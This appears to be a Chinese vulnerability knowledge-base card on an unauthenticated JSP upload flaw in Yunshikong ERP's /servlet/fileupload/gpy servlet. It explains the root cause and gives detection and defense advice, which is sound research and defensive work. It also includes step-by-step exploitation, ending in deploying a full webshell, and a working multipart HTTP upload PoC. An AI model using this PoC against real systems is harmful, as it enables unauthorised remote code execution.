---
id: web-generic-file-upload-yunshikong-erp-gpy-servlet-unauth-jsp
title: 云时空 ERP /servlet/fileupload/gpy 未授权任意文件上传：手写 multipart 不用扩展名白名单，JSP 落 uploads/pics 日期目录
type: scenario
domain: web
path: web/generic/file-upload
technique: yunshikong-erp-gpy-servlet-unauth-upload-jsp
aliases:
- 云时空 ERP 文件上传
- GPYAjaxUploadFileServlet
- /servlet/fileupload/gpy
- extensionPermit 未使用
- 手写 multipart 解析上传
- uploads/pics 日期目录
tags:
- java
- erp
- file-upload
- arbitrary-upload
- jsp
- webshell
- shiro
- multipart
- unauthorized
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V535
  verified_at: '2026-11-11T17:42:44+08:00'
  notes: 已对照原文全文与12张截图(img_small)核对：图01 web.xml CharacterEncodingFilter与shiroFilter(DelegatingFilterProxy, url-pattern /*)；图02 AjaxUploadFileServlet映射/servlet/fileupload、GPYAjaxUploadFileServlet映射/servlet/fileupload/gpy(com.ysk360.emsm.form.fileupload包)；图03 spring-context-shiro的shiroFilter bean(CustomShiroFilterFactoryBean)；图04 filterChainDefinitions含 /servlet/fileupload/gpy* = anon、/** = kickout,user、/act/rest/... perms；图05/06 Servlet常量uploadFolderName=/pics/、uploadDirKey=picUploadDir、fileMaxSize=80000000L、extensionPermit={jpg,png,gif,bmp}(代码中未被使用)；图07 doPost读rotate/seal/point、从Content-Type取boundary/lastboundary、SimpleDateFormat yyyy-M-d；图08 DataInputStream.readFully+按行状态机+filename=分支；图09 pos22截取fileFormName、s3/s4/s5=lastIndexOf(\)+1、out.print(fileRealName=...)、saveDirectoryPath=curProjectPath+/uploads+/pics/+curDate；图10 SMB与本地分支、File(...,s5)、fileout.write(b3,0,b3.length-1)；图11 out.print(date=curDate)；图12 Burp POST /servlet/fileupload/gpy multipart(filename=check.jsp)响应fileRealName=check.jspdate=2023-12-20。卡中Shiro放行、手写multipart、无扩展名校验、落盘路径与回显与截图逐项一致；原文未展示JSP执行截图，卡已标confidence
    medium并注明RCE依赖容器解析uploads/pics下*.jsp，属未验证点。原文无产品版本号，未设affected_versions正确。dedup候选Artery ERP/万户OA/金和OA/泛微云桥等均为不同产品/入口，非同链；经查库内云时空同类卡仅两篇SQLi卡，非本链；dup-scan无涉及pair。卡片原子，保留verified。未对真实目标发请求。
---

## 一句话结论

云时空 ERP 的 Shiro 过滤链把 `/servlet/fileupload/gpy* = anon` 放行，`GPYAjaxUploadFileServlet` 手写解析 `multipart/form-data` 时只从 `filename=` 后取 basename，完全不校验扩展名/Content-Type（代码里定义的 `extensionPermit={"jpg","png","gif","bmp"}` 从未使用），并把内容写入 `webroot/uploads/pics/<yyyy-M-d>/<filename>`，响应还回显 `fileRealName` 与 `date`；攻击者无需登录上传 `.jsp`，按返回日期拼出路径即可访问执行，形成未授权 RCE。

## 原理

- **Shiro 链放行**：`spring-context-shiro` 中 `shiroFilterChainDefinitions` 配置 `/servlet/fileupload/gpy* = anon`，即该上传 Servlet 不需要认证；其他路径多为 `kickout,user` 或 `perms[...]`。`web.xml` 把 `GPYAjaxUploadFileServlet` 映射到 `/servlet/fileupload/gpy`，另一个 `AjaxUploadFileServlet` 映射到 `/servlet/fileupload`。
- **手写 multipart 解析**：Servlet 直接从 `request.getInputStream()` 读入全部请求体到 `dataOrigin`，从 `Content-Type` 中提取 `boundary`/`lastboundary`，按行扫描状态机：遇到 boundary 进入字段/文件解析；`filename=` 存在时按 `s.indexOf("filename=")`、`substring` 截取文件名，取最后一个反斜杠后的 basename 作为 `s5`。
- **白名单是死代码**：类中定义了 `private static final String[] extensionPermit = {"jpg","png","gif","bmp"}`，但后续保存流程完全没有引用它；也没有检查 `Content-Type`、文件头或后缀。`out.print("fileRealName=" + s5 + "")` 还直接把真实文件名回显给攻击者。
- **路径可预测且可访问**：保存目录为 `curProjectPath + "/uploads" + "/pics/" + curDate + "/"`（`curDate` 由 `SimpleDateFormat("yyyy-M-d")` 生成），文件名为 `s5`；若配置了 `picUploadDir` 则改用该目录。最后 `out.print("date=" + curDate)` 把日期回显，攻击者据此得到完整 URL：`/uploads/pics/<date>/<filename>`。
- **为什么能 RCE**：Java Web 容器通常把 Web 根下任意 `*.jsp` 交给 JSP Servlet 编译执行；上传目录在 `curProjectPath/uploads/pics/...`，属于 Web 根内，因此写入的 JSP 可直接访问执行。`fileout.write(b3, 0, b3.length - 1)` 会丢掉文件内容最后一个字节，JSP 末尾留一个换行即可避免截断 `%>`。原文只展示了上传请求与 `fileRealName`/`date` 回显，未展示访问 JSP 执行结果的截图；RCE 结论基于落盘路径与 Java 容器默认解析 `*.jsp` 的行为，实际利用需确认目标容器的 URL 映射与上传目录权限。
- **SMB 分支**：若 `picUploadDir` 为空且 `isShare` 为真，会走 `SmbUtil.uploadFile` 把文件写到网络共享；默认 `isShare=false` 走本地文件写入，原文复现即默认分支。

## 触发条件

- 目标为云时空 ERP（`com.ysk360.emsm` 包），Web 管理端可达。
- Shiro 过滤链保持默认，`/servlet/fileupload/gpy*` 为 anon；或攻击者能访问 `/servlet/fileupload` 的同类 Servlet。
- Web 根目录（`curProjectPath/uploads/...`）对 Web 进程可写，且容器会解析该目录下的 JSP。
- 上传大小不超过 `fileMaxSize`（80MB），Content-Type 为 `multipart/form-data`。

## 利用步骤

1. 直接向 `POST /servlet/fileupload/gpy` 发送 `multipart/form-data`，文件字段名任意（如 `file1`），`filename="check.jsp"`，内容为 JSP 代码。
2. 读取响应：`fileRealName=check.jspdate=<yyyy-M-d>`，取 `date` 值。
3. 访问 `http://target/uploads/pics/<date>/check.jsp`（若配置了 `picUploadDir` 则替换为该目录），确认 JSP 执行。
4. 换成功能完整的 JSP Webshell（命令执行/文件管理），按需清理。

## PoC

```http
POST /servlet/fileupload/gpy HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=4eea98d02AEa93f60ea08dE3C18A1388
Content-Length: 238

--4eea98d02AEa93f60ea08dE3C18A1388
Content-Disposition: form-data; name="file1"; filename="check.jsp"
Content-Type: application/octet-stream

<% out.print("PWNED"); %>
--4eea98d02AEa93f60ea08dE3C18A1388--
```

响应（原文截图）：

```text
fileRealName=check.jspdate=2023-12-20
```

访问：

```text
GET /uploads/pics/2023-12-20/check.jsp
```

## 变体与关联

- **文件名路径穿越**：代码只取最后一个反斜杠后的 basename；在 Linux 上反斜杠不是分隔符，若 `s5` 中含 `../` 且未规范化，可能写到 `uploads/pics/<date>/` 之外，需按实际文件系统验证。
- **其他上传 Servlet**：`/servlet/fileupload` 的 `AjaxUploadFileServlet` 与 GPY 版本可能共用或复制了同一套手写解析逻辑，可一并测试。
- **配置分支**：`Global.getConfig("picUploadDir")` 非空时写自定义目录；`isShare` 为真时走 SMB，落点变为共享目录，利用方式随环境变化。
- **同产品其他漏洞**：云时空 ERP 的 SQL 注入见 [[web-generic-sqli-yunshikong-validate-loginname-mybatis-dollar-statementtype-blind]]、[[web-generic-sqli-yunshikong-erp-slogin-service-db-select-raw-sql]]。
- **同类 Java ERP 上传**：[[web-generic-file-upload-artery-erp-servletupload-phoneupload]]、[[web-java-component-yonyou-ksoa-imageupload-arbitrary-file-upload]]、[[web-java-component-dahua-material-file-upload-webshell]]。

## 检测与防御

- **检测（Web 日志）**：`POST /servlet/fileupload/gpy` 或 `/servlet/fileupload` 来自未登录会话；multipart 的 `filename` 以 `.jsp`/`.jspx`/`.war` 等脚本后缀结尾；响应出现 `fileRealName=` 与 `date=`；随后访问 `/uploads/pics/<date>/*.jsp`。
- **检测（文件/主机）**：`uploads/pics/` 下出现 JSP/脚本文件；Web 根新增可执行文件；容器编译新 JSP（临时 work 目录新增 class）。
- **防御**：恢复 `extensionPermit` 白名单校验并同时校验 Content-Type/文件头；文件名随机化并强制后缀；把上传目录移到 Web 根之外或用对象存储；对上传目录禁用 JSP 解析（如 Tomcat 映射/nginx 规则）；Shiro 链不要把上传接口设为 `anon`；WAF 拦截 multipart 中的脚本后缀。
